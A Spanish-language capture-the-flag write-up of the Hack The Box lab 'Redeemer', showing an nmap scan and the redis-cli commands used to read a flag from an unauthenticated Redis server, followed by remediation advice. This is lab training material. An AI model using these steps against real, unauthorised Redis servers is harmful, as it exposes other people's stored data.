# 🖥️ Redeemer

**Plataforma:** HTB
**Dificultad:** Easy

---

## 1. 🔎 Reconocimiento

Se realiza un escaneo con Nmap:

```bash
nmap -sCV -p- [IP]
```

---

## 2. 🔍 Enumeración

### Puertos

| Puerto | Servicio | Versión     |
| ------ | -------- | ----------- |
| 6379   | Redis    | Redis 5.0.7 |

### Otros hallazgos

* Redis es un almacén **key-value**.
* Se puede interactuar con el servicio mediante `redis-cli`.

---

## 3. 💥 Explotación

**Vulnerabilidad:** Redis accesible sin autenticación.

Nos conectamos:

```bash
redis-cli -h [IP]
```

Una vez dentro, usamos `INFO` para obtener información del servidor:

```bash
INFO
```

Seleccionamos la base de datos:

```bash
SELECT [DB]
```

Listamos las claves:

```bash
KEYS *
```

Encontramos la clave:

```text
flag
```

Consultamos su valor:

```bash
GET flag
```

**Resultado:** Obtenemos la flag.

---

## 4. 🐚 Escalada de privilegios

No es necesaria. La flag es accesible directamente desde Redis.

---

## 5. 📄 Reporte

### Vulnerabilidades

* **Redis sin autenticación** → Permite acceder a la base de datos y consultar información almacenada.

### Remediación

* Configurar autenticación en Redis.
* Restringir el acceso al servicio mediante firewall y segmentación de red.

---

## 🧠 Lessons Learned

* **Aprendí:** Redis, bases de datos key-value.
* **Herramientas:** Nmap, redis-cli.
* **Comandos nuevos:** `INFO`, `SELECT`, `KEYS`, `GET`.
